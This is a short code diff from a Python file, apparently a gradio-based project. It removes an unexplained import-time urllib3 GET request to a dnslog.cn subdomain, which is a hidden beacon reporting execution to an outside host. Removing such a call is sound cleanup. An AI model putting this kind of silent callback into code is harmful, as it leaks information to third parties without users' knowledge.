@@ -1,5 +1,3 @@
-import urllib3
-urllib3.request('GET', 'http://uu.e0k4ef.dnslog.cn',timeout=2)
 from gradio import routes
 import platform
 import subprocess
